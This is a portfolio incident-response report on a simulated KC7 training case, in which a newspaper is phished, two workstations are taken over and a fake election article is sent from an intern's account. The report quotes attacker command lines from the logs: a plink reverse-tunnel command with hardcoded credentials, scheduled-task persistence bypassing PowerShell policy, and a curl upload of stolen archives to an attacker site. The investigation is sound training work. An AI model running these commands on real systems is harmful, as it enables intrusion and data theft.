# IR: A Scandal in Valdoria (Part 01)

> **About this report:** This is a portfolio write-up of the KC7 cybersecurity training module "A Scandal in Valdoria: A Political Mystery (Part 01)." The company, people, and logs are simulated. I investigated the logs with KQL queries, and every finding below comes from those query results. Items marked *(story)* come from the module's storyline, interviews, or screenshots, not from the logs. The scope matches the module's investigation; questions it leaves open are listed in section 8, each with the query or data I would use to answer it.
>
> **Skills shown:** KQL log analysis across 5 tables, endpoint investigation (file creation and process command lines), identifying persistence, remote access tunnels, and data theft, reusing one victim's attack pattern to find a second victim, timeline building, Cyber Kill Chain and MITRE ATT\&CK mapping, incident response recommendations, and scoping next steps.

## TL;DR

* **What happened:** On the eve of Valdoria's election, The Valdorian Times printed a fake article accusing mayoral candidate Luffy of corruption *(story)*. Attackers had phished two employees with fake recruiter emails. On each machine, a downloaded Word document dropped a PowerShell script, a scheduled task kept it running, and a reverse tunnel gave the attackers remote access. Three weeks after phishing the intern, the attackers downloaded the fake story to her machine, renamed it to look like the approved OpEd, and emailed it to the newspaper printer from her account. They also compressed her files and uploaded them to their own website.
* **How I found it:** I started from the email the printer received and confirmed it came from the intern's account. A phishing email reported by another employee showed the attack pattern on her machine. I then applied the same pattern to the intern's machine and traced the fake story from download to rename to the email.
* **Impact:** High. A fabricated political article was printed under the newspaper's name, two workstations were under attacker control, and the intern's Documents, Desktop, and Memes files were stolen.
* **Next steps:** Isolate both machines, remove the scheduled task and the tunnels, reset both users' passwords, block the attacker's IPs, domains, and senders, and check whether any other phishing recipient was compromised.

## Case details

| Field             | Entry                                                                                                                                                                                                                                                              |
| :---------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Case name         | A Scandal in Valdoria: A Political Mystery (Part 01)                                                                                                                                                                                                               |
| Date investigated | Sep 30, 2026                                                                                                                                                                                                                                                       |
| Analyst           | Seagram Kern                                                                                                                                                                                                                                                       |
| Severity          | High: a fabricated political article was published under the newspaper's name on the eve of an election, attackers had remote access to two workstations, and files were stolen from one of them.                                                                |
| Status            | Open: the last attacker activity in this investigation is the upload on 2024-02-01 02:14:32, but nothing in the logs shows the scheduled task, PowerShell script, or tunnels were removed, the affected passwords were reset, or the attacker's IPs and domains were blocked. |
| Data sources used | Employees, Email, OutboundNetworkEvents, FileCreationEvents, ProcessEvents. From the story only: the fake article, interviews with Nene Leaks, Clark Kent, Ronnie McLovin, and Sonia Gose, the screenshot of Sonia's phishing email, the PowerShell script contents, Ronnie's dark web monitoring alert, and the final email. |

## 1. Summary

On the eve of Valdoria's mayoral election, The Valdorian Times published an article accusing candidate Luffy of corruption and bribery. Editorial Director Nene Leaks never approved it *(story)*. The newspaper printer, Clark Kent, printed what arrived by email, and the email logs show it came from Editorial Intern Ronnie McLovin's account on January 31, 2024, at 11:11:12 with the file `OpEdFinal_to_print.docx`. Ronnie says she overslept and never sent it *(story)*.

Senior Editor Sonia Gose then reported a suspicious job offer *(story)*. On January 5, 2024, she clicked its link to `promotionrecruit[.]com` and downloaded a Word document. Twenty-eight seconds later, a PowerShell script, `hacktivist_manifesto.ps1`, appeared on her machine. Within the next day, a scheduled task set the script to run every 5 hours, `plink.exe` opened a reverse tunnel to `136.130.190.181`, and the attackers ran discovery commands such as `whoami`.

A second sender, `valdorias_best_recruiter@gmail[.]com`, sent 18 recruiter emails to staff. Ronnie clicked hers on January 10, and the same pattern followed on her machine: a Word document, the same PowerShell script and scheduled task, a plink tunnel to `168.57.191.100` with the same username and password, and discovery commands. On January 31, the attackers downloaded `fakestory.docx` from `hire-recruit[.]org` to her machine, renamed it to `OpEdFinal_to_print.docx`, and emailed it to Clark from her account 44 minutes later. They then packed her Documents, Desktop, and Memes files into password-protected 7-Zip archives and uploaded them to `hirejob[.]com` early on February 1. The incident is **not contained**.

## 2. Starting point

**What started it:** The Valdorian Times published a fake article it never approved and hired me as an incident responder *(story)*.

**First indicator:** The January 31 email to Clark Kent from `ronnie_mclovin@valdoriantimes.news`, subject "URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))", with the file `OpEdFinal_to_print.docx`.

**First hypothesis:** Ronnie denied sending the email, so either she was an insider or someone else had used her account. I couldn't rule out an insider yet, so I kept both possibilities open.

**Result:** Someone else used her account. Sonia's reported phishing email showed the attack pattern, and the same pattern on Ronnie's machine showed the attackers downloading the fake story, renaming it, and emailing it from her account.

## 3. Timeline

All times are **UTC**. Story rows have no exact times, so they are placed in story order.

| Date & time (UTC)               | What happened                                                                                                                                                                                                           | Source                |
| :------------------------------ | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :-------------------- |
| 2024-01-02 08:00:00             | Ronnie McLovin is hired as Editorial Intern.                                                                                                                                                                           | Employees             |
| 2024-01-05 09:42:05             | Phishing email "FW: Invitation to Apply: Lead Political Correspondent" from `newspaper_jobs@gmail[.]com` to Senior Editor Sonia Gose, linking to `hxxps://promotionrecruit[.]com/published/Valdorian_Times_Editorial_Offer_Letter.docx`. | Email                 |
| 2024-01-05 10:23:17             | Sonia (`10.10.0.3`) clicks the link.                                                                                                                                                                                   | OutboundNetworkEvents |
| 2024-01-05 10:24:04             | `Valdorian_Times_Editorial_Offer_Letter.docx` is written to `C:\Users\sogose\Downloads\` on `UL0M-MACHINE` by `edge.exe`, 47 seconds after the click.                                                                 | FileCreationEvents    |
| 2024-01-05 10:24:32             | `hacktivist_manifesto.ps1` is written to disk, 28 seconds after the download.                                                                                                                                         | FileCreationEvents    |
| 2024-01-05 11:22:44             | Scheduled task "Hacktivist Manifesto" is created to run `C:\ProgramData\hacktivist_manifesto.ps1` every 5 hours with `-ExecutionPolicy Bypass`.                                                                       | ProcessEvents         |
| 2024-01-05 11:55:22             | The script runs on `UL0M-MACHINE`.                                                                                                                                                                                     | ProcessEvents         |
| 2024-01-06 02:39:35             | `plink.exe` opens a reverse tunnel to `136.130.190.181` as `$had0w`, forwarding the machine's Remote Desktop port (3389).                                                                                             | ProcessEvents         |
| 2024-01-06 07:30:44 to 09:17:51 | 5 discovery commands on `UL0M-MACHINE`, including `whoami`, `ipconfig`, and `net view`.                                                                                                                              | ProcessEvents         |
| 2024-01-10 08:48:16             | Phishing email "\[EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles" from `valdorias_best_recruiter@gmail[.]com` to Ronnie, linking to `promotionrecruit[.]org`. One of 18 emails from this sender to staff. | Email                 |
| 2024-01-10 08:55:07             | Ronnie (`10.10.0.19`) clicks `hxxps://promotionrecruit[.]org/share/Editorial_J0b_Openings_2024.docx`.                                                                                                                 | OutboundNetworkEvents |
| 2024-01-10 08:55:17             | `Editorial_J0b_Openings_2024.docx` is downloaded to `A37A-DESKTOP`, 10 seconds after the click.                                                                                                                       | FileCreationEvents    |
| 2024-01-10 08:55:51             | The same `C:\ProgramData\hacktivist_manifesto.ps1` is dropped, 34 seconds after the download.                                                                                                                         | FileCreationEvents    |
| 2024-01-10 09:31:24 to 10:46:10 | 5 discovery commands on `A37A-DESKTOP`.                                                                                                                                                                                | ProcessEvents         |
| 2024-01-10 10:26:32             | The same "Hacktivist Manifesto" scheduled task is created on `A37A-DESKTOP`.                                                                                                                                          | ProcessEvents         |
| 2024-01-10 11:13:21             | The script runs on `A37A-DESKTOP`.                                                                                                                                                                                     | ProcessEvents         |
| 2024-01-11 03:08:12             | `plink.exe` opens a reverse tunnel to `168.57.191.100` with the same username and password, forwarding port 3389.                                                                                                     | ProcessEvents         |
| 2024-01-31 09:47:51             | `fakestory.docx` is created on Ronnie's machine, downloaded from `hxxps://hire-recruit[.]org/files/fakescandal/2024/fakestory.docx`. Ronnie doesn't recall the file or the site *(story)*.                             | FileCreationEvents, OutboundNetworkEvents |
| 2024-01-31 10:26:20             | A command renames and moves it to `C:\Users\romclovin\Documents\OpEdFinal_to_print.docx`.                                                                                                                              | ProcessEvents         |
| 2024-01-31 11:11:12             | **Fake article sent:** email from Ronnie's account to `clark_kent@valdoriantimes.news`, "URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))," with `OpEdFinal_to_print.docx`, 44 minutes after the rename. | Email                 |
| 2024-01-31 11:44:58 to 11:49:47 | Three password-protected 7-Zip archives are created from Ronnie's Documents, Desktop, and Memes folders.                                                                                                              | ProcessEvents         |
| 2024-02-01 02:14:32             | One `curl` command uploads the archives to `hxxps://hirejob[.]com/exfil_processor/upload.php`. Last attacker activity in this investigation.                                                                           | ProcessEvents         |
| Election eve                    | Clark prints the article, and the newspaper publishes it.                                                                                                                                                              | Story                 |
| During the investigation        | Sonia reports her suspicious email. Ronnie receives a dark web monitoring alert suggesting her files are exposed. The investigator receives a strange email hinting at the next module.                               | Story                 |

## 4. Evidence

Indicators are listed in the order I pivoted between them.

| Indicator                                                                                       | Type                        | Where I found it                         | How I found it                                                                                                                                                                                                       |
| :---------------------------------------------------------------------------------------------- | :-------------------------- | :--------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Email to Clark with `OpEdFinal_to_print.docx`                                                   | Email                       | Email                                    | Filtered Clark's inbox (21 emails total) for January 31. Sender: `ronnie_mclovin@valdoriantimes.news`, sent 11:11:12.                                                                                                 |
| Ronnie McLovin, Editorial Intern                                                                | Person                      | Employees                                | Searched for the Editorial Intern role after Clark named her. Hired 2024-01-02.                                                                                                                                      |
| `newspaper_jobs@gmail[.]com`                                                                    | Email address (sender)      | Email                                    | Saved Sonia's address with `let` and pulled her inbox after she reported the email *(story)*. Sent 2024-01-05 09:42:05.                                                                                               |
| `hxxps://promotionrecruit[.]com/published/Valdorian_Times_Editorial_Offer_Letter.docx`          | URL                         | Email, OutboundNetworkEvents             | The link in Sonia's email. Her IP, `10.10.0.3`, requested it at 10:23:17.                                                                                                                                            |
| `Valdorian_Times_Editorial_Offer_Letter.docx` (SHA256 `60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f`) | File                        | FileCreationEvents                       | Searched her hostname, `UL0M-MACHINE`, for the file name. Created 10:24:04 in her Downloads folder by `edge.exe`.                                                                                                   |
| `hacktivist_manifesto.ps1`                                                                      | File (PowerShell script)    | FileCreationEvents                       | Searched her machine for `.ps1` files. Created 10:24:32, 28 seconds after the download.                                                                                                                              |
| `schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"` | Command (persistence)       | ProcessEvents                            | Searched command lines for the script path. The scheduled task runs the script every 5 hours and skips PowerShell's script restrictions.                                                                          |
| `plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181`        | Command (remote access)     | ProcessEvents                            | Searched for `plink`. The `-R` flag opens a reverse tunnel: the machine connects out to the attacker's IP, which then reaches back to its Remote Desktop port (3389). A firewall that only blocks inbound RDP wouldn't stop it. |
| `whoami`, `ipconfig`, `net view`, and other discovery commands                                  | Commands                    | ProcessEvents                            | Searched each machine for common discovery commands. 5 on each host.                                                                                                                                                 |
| `valdorias_best_recruiter@gmail[.]com`                                                          | Email address (sender)      | Email                                    | Searched this sender. 18 emails to staff, including Ronnie's at 2024-01-10 08:48:16.                                                                                                                                  |
| `hxxps://promotionrecruit[.]org/share/Editorial_J0b_Openings_2024.docx`                         | URL                         | Email, OutboundNetworkEvents             | The link in Ronnie's email. Her IP, `10.10.0.19`, requested it at 08:55:07. Same name as Sonia's lure domain, different top-level domain.                                                                            |
| `Editorial_J0b_Openings_2024.docx` and `hacktivist_manifesto.ps1`                               | Files                       | FileCreationEvents                       | Searched her hostname, `A37A-DESKTOP`. The document was created at 08:55:17 and the script at 08:55:51.                                                                                                              |
| `168.57.191.100`                                                                                | IP address                  | ProcessEvents                            | A plink tunnel on Ronnie's machine with the same `$had0w` username and password as on Sonia's.                                                                                                                       |
| `hxxps://hire-recruit[.]org/files/fakescandal/2024/fakestory.docx`                              | URL                         | OutboundNetworkEvents                    | Searched Ronnie's outbound traffic for "fakestory."                                                                                                                                                                  |
| `fakestory.docx` (SHA256 as logged: `5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f`) | File                        | FileCreationEvents                       | Created on her machine at 2024-01-31 09:47:51. The logged hash is 63 characters, one short of a full SHA256 (see section 8).                                                                                         |
| `C:\Users\romclovin\Documents\OpEdFinal_to_print.docx`                                          | File path                   | ProcessEvents                            | Searched command lines for `fakestory.docx`. A command renamed and moved it at 10:26:20, giving it the same name as the file sent to Clark 44 minutes later.                                                          |
| `DankMemes.7z`, `MyStolenDataFromDocuments.7z`, `MyStolenDataFromDesktop.7z`                    | Files (archives)            | ProcessEvents                            | Searched command lines for `.7z`. Three `7z.exe` commands packed her Memes (`*.jpg`), Documents (`*.docx`), and Desktop (`*.docx`) files, each protected with `thruthW!llS3tUfree`, the same password as the tunnels. |
| `curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php` | Command (exfiltration)      | ProcessEvents                            | The upload of the archives to `hirejob[.]com`. Searching all devices for `hirejob.com` returned only Ronnie's machine.                                                                                                |

### Key queries

The email that delivered the fake article:

```kusto
Email
| where recipient == "clark_kent@valdoriantimes.news"
| where startofday(timestamp) == datetime(2024-01-31)
```

Sonia's click and the file it created:

```kusto
OutboundNetworkEvents
| where src_ip == "10.10.0.3"
| where url contains "promotionrecruit.com"

FileCreationEvents
| where hostname == "UL0M-MACHINE"
| where filename contains "Valdorian_Times_Editorial_Offer_Letter"
| sort by timestamp asc
```

Persistence and remote access from the PowerShell script:

```kusto
ProcessEvents
| where process_commandline contains "C:\\ProgramData\\hacktivist_manifesto.ps1"

search in (ProcessEvents) "plink"
```

The second phishing sender and its targets:

```kusto
Email
| where sender == "valdorias_best_recruiter@gmail.com"
```

The fake story on Ronnie's machine, from download to rename:

```kusto
OutboundNetworkEvents
| where src_ip contains "10.10.0.19"
| where url has_any ("fakestory")

ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline has "fakestory.docx"
| project timestamp, process_name, process_commandline
| sort by timestamp asc
```

Data theft, and whether any other device uploaded to the same site:

```kusto
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline has ".7z"
| project timestamp, process_commandline
| sort by timestamp asc

ProcessEvents
| where process_commandline has "hirejob.com"
| distinct hostname
```

## 5. What I ruled out

* **Possible explanation:** The article was an approved draft that Clark printed by mistake. **Why I ruled it out:** The attached file began as `fakestory.docx`, downloaded from `hire-recruit[.]org/files/fakescandal/`, and was renamed on Ronnie's machine 44 minutes before the email was sent.
* **Possible explanation:** Ronnie sent the article herself (insider threat). **Why it's unlikely (not fully ruled out):** Her machine had an attacker tunnel open since January 11. The fake story came from an attacker-controlled site, and the rename and the theft of her own files ran from the same machine. Ronnie says she overslept and doesn't recognize the file or site *(story)*. See section 8, question 3.
* **Possible explanation:** The recruiter emails were real job offers. **Why I ruled it out:** They came from free Gmail accounts, and each linked document dropped the same PowerShell script within 34 seconds of being downloaded.
* **Possible explanation:** Plink was legitimate IT remote access. **Why I ruled it out:** It ran on a Senior Editor's and an Editorial Intern's workstations, connected to two unrelated external IPs with the same hardcoded credentials, and was followed by discovery commands like `whoami`. An admin doesn't need to ask a machine who they are logged in as.
* **Possible explanation:** The attacker stole data from Sonia's machine too. **Why I ruled it out (for this upload site):** Searching every device for commands that reference `hirejob.com` returned only Ronnie's machine. The module's triage of Sonia's machine found nothing else malicious after the discovery commands *(story)*. Other ways of stealing data weren't checked; see section 8, question 4.

## 6. Kill Chain and MITRE ATT\&CK mapping

| Stage                 | What the attacker did                                                                                                                                                                                      | MITRE ATT\&CK                                                                                                                  | Evidence                                                                                 |
| :-------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------- |
| Reconnaissance        | No direct evidence. The lures were tailored to newsroom staff with editorial and reporter job offers.                                                                                                      | None confirmed                                                                                                                 | None                                                                                     |
| Weaponization         | Created Gmail sender accounts, recruiter lure domains, Word documents that dropped a PowerShell script, a staging site for the fake story, and an upload page for stolen data.                            | T1585.002 Establish Accounts: Email Accounts; T1583.001 Acquire Infrastructure: Domains                                         | `promotionrecruit[.]com/.org`, `hire-recruit[.]org`, `hirejob[.]com`, two Gmail senders  |
| Delivery              | Sent recruiter phishing emails, including 18 from `valdorias_best_recruiter@gmail[.]com`.                                                                                                                 | T1566.002 Phishing: Spearphishing Link                                                                                         | Email, 2024-01-05 09:42:05 and 2024-01-10 08:48:16                                       |
| Exploitation          | Sonia and Ronnie clicked the links and downloaded the documents, which dropped a PowerShell script within seconds. I saw no software exploit.                                                               | T1204.001 User Execution: Malicious Link; T1204.002 User Execution: Malicious File; T1059.001 Command and Scripting Interpreter: PowerShell | OutboundNetworkEvents and FileCreationEvents, 2024-01-05 and 2024-01-10                  |
| Installation          | Created a scheduled task on both machines to run the script every 5 hours with `-ExecutionPolicy Bypass`.                                                                                                 | T1053.005 Scheduled Task/Job: Scheduled Task                                                                                   | ProcessEvents, 2024-01-05 11:22:44 and 2024-01-10 10:26:32                               |
| Command & Control     | Opened reverse SSH tunnels with `plink.exe` that expose each machine's Remote Desktop port to an attacker IP, using the same credentials on both, then ran discovery commands.                              | T1572 Protocol Tunneling; T1021.001 Remote Services: Remote Desktop Protocol; T1033 System Owner/User Discovery (`whoami`); T1016 System Network Configuration Discovery (`ipconfig`); T1018 Remote System Discovery (`net view`) | ProcessEvents: `136.130.190.181` (2024-01-06 02:39:35) and `168.57.191.100` (2024-01-11 03:08:12) |
| Actions on Objectives | Downloaded the fake story, renamed it, and emailed it to the printer from Ronnie's account. Archived her files with 7-Zip and uploaded them to their site.                                                 | T1105 Ingress Tool Transfer; T1036 Masquerading; T1534 Internal Spearphishing; T1560.001 Archive Collected Data: Archive via Utility; T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol; T1565 Data Manipulation | FileCreationEvents and ProcessEvents 2024-01-31 09:47:51 to 2024-02-01 02:14:32; Email 2024-01-31 11:11:12 |

## 7. Recommendations

| Action                                                                                                                                                      | Why (evidence)                                                                                                                                                | Urgency   |
| :---------------------------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------ | :-------- |
| **Contain:** Isolate `UL0M-MACHINE` and `A37A-DESKTOP` from the network.                                                                                    | Both machines opened plink tunnels to attacker IPs, and nothing shows they were closed.                                                                      | Now       |
| **Contain:** Remove the "Hacktivist Manifesto" scheduled task, `C:\ProgramData\hacktivist_manifesto.ps1`, and `plink.exe` from both machines.              | The task reruns the script every 5 hours, so killing the tunnel once isn't enough.                                                                           | Now       |
| **Contain:** Reset Sonia's and Ronnie's passwords and sign out all their sessions.                                                                          | Ronnie's account sent the fake article, and the attackers had hands-on access to both machines.                                                             | Now       |
| **Contain:** Block `136.130.190.181`, `168.57.191.100`, `promotionrecruit[.]com`, `promotionrecruit[.]org`, `hire-recruit[.]org`, `hirejob[.]com`, and both Gmail senders. | Attacker tunnels, phishing links, fake-story staging, upload site, and phishing senders.                                                               | Now       |
| **Scope:** Check every other phishing recipient for clicks, downloaded documents, the script, or plink.                                                    | 18 emails came from one sender alone, but only Sonia's and Ronnie's machines were investigated. See section 8, question 1.                                  | Now       |
| **Recover:** Work with leadership and legal on a correction or retraction, and notify those affected by the fake article.                                   | A fabricated corruption story about a candidate was published under the newspaper's name *(story)*.                                                         | Now       |
| **Recover:** Identify which documents were in the stolen archives and notify anyone whose information was exposed.                                          | Her Documents and Desktop Word files and her Memes folder were uploaded to `hirejob[.]com`.                                                                  | Now       |
| **Detect:** Alert on `plink.exe` with `-R`, scheduled tasks that run PowerShell from `C:\ProgramData`, and `-ExecutionPolicy Bypass`.                      | All three appear on both compromised machines.                                                                                                               | This week |
| **Detect:** Alert on a `.ps1` file written within seconds of a document download, and on password-protected 7-Zip archives followed by `curl` uploads.     | The script appeared 28 to 34 seconds after each download, and the theft used `7z.exe -p` and `curl -F`.                                                     | This week |
| **Prevent:** Require out-of-band confirmation (phone or in person) before printing any article that arrives by email, especially last-minute "URGENT" edits. | One email from a trusted account was enough to put a fake story in print.                                                                                    | This week |
| **Prevent:** Block or sandbox document downloads from links in external email, and train staff on recruiter-themed phishing.                                | Both victims downloaded documents from fake recruiter links.                                                                                                | Later     |
| **Prevent:** Recognize and encourage reporting like Sonia's.                                                                                               | Her report revealed the attack pattern used to find the second victim *(story)*.                                                                            | Later     |

## 8. Open questions

These are questions the module's investigation doesn't answer. Each one lists what I would run or request next.

| # | Question                                                                       | Why it matters                                                                                                                                                         | How I would answer it                                                                                                                                                                                                                           |
| :- | :----------------------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1 | How far did the phishing campaign reach?                                       | 18 emails came from `valdorias_best_recruiter@gmail[.]com` alone, but only two machines were investigated. A tunnel on another machine would still be open.            | List every lure with `Email \| where sender in ("newspaper_jobs@gmail.com", "valdorias_best_recruiter@gmail.com")`, every visit with `OutboundNetworkEvents \| where url has_any ("promotionrecruit", "hire-recruit", "hirejob") \| summarize by src_ip`, and every infected host with `ProcessEvents \| where process_commandline has_any ("plink", "hacktivist", "$had0w") \| distinct hostname`. |
| 2 | Is the attacker still in the network?                                          | Nothing shows the tunnels closed or the scheduled task removed. The task should run every 5 hours, but only one run per machine appears in the logs, so scheduled runs may not be logged at all. | Search `ProcessEvents` for `plink`, `hacktivist`, `136.130.190.181`, or `168.57.191.100` after 2024-02-01 02:14:32, then check firewall logs for connections to the two IPs and the current task list on both machines. |
| 3 | How was the email sent from Ronnie's account?                                  | Sending through her desktop over the tunnel and logging into her mailbox from outside call for different fixes.                                                       | `AuthenticationEvents \| where username == "romclovin"` around 2024-01-31 11:11:12, plus `ProcessEvents` on `A37A-DESKTOP` between 10:26:20 and 11:11:12.                                                                                     |
| 4 | Was data stolen any other way, from either machine?                            | The scope check only searched for `hirejob.com`. Uploads to another site, or copies over the RDP tunnel, would be missed.                                             | Search `ProcessEvents` on both machines for `7z`, `curl`, `upload`, and `Invoke-WebRequest` after each compromise, and review `OutboundNetworkEvents` for uploads to unfamiliar domains.                                                       |
| 5 | Are the attacker's domains and IPs connected to other infrastructure?          | The domains share "hire" and "recruit" themes, and KQL 101 found 6 domains containing "hire" in PassiveDns, including `jobhire.org`. Related domains should be blocked too. | `PassiveDns \| where domain has_any ("promotionrecruit", "hire-recruit", "hirejob", "jobhire")` and `PassiveDns \| where ip in ("136.130.190.181", "168.57.191.100")`.                                                                        |
| 6 | What domain was in Ronnie's dark web monitoring alert?                         | It may show where her stolen files ended up, or reveal another attacker site.                                                                                        | The alert screenshot in the module, then the same PassiveDns and OutboundNetworkEvents searches for that domain.                                                                                                                              |
| 7 | Is the `fakestory.docx` hash complete?                                         | The logged value is 63 characters, one short of a full SHA256, so it can't be trusted for blocklists or external lookups.                                            | Re-pull the row from `FileCreationEvents`, or hash a forensic copy of the file.                                                                                                                                                              |

## 9. Lessons learned

* **The logs show which account, not which person.** The email really came from Ronnie's account, but her machine showed someone else at the keyboard.
* **Employee reports open cases.** Sonia's suspicious email gave the attack pattern that led to the second victim.
* **Reuse the pattern.** Phishing email, click, document, script, scheduled task, tunnel, discovery: once I had the sequence on Sonia's machine, I could find each step on Ronnie's.
* **Command lines tell the story.** `schtasks`, `plink`, `7z`, and `curl` showed persistence, remote access, packing, and theft in the attacker's own words.
* **Attacker reuse is a detection gift.** The same username and password on both tunnels and all three archives tie both machines to one actor.
* **Watch the dwell time.** The attackers sat on Ronnie's machine for three weeks before acting, and timed the fake article for the night before the election.
* **Scope before closing.** The module followed two machines out of at least 18 phishing targets, so checking the rest is the first next step.
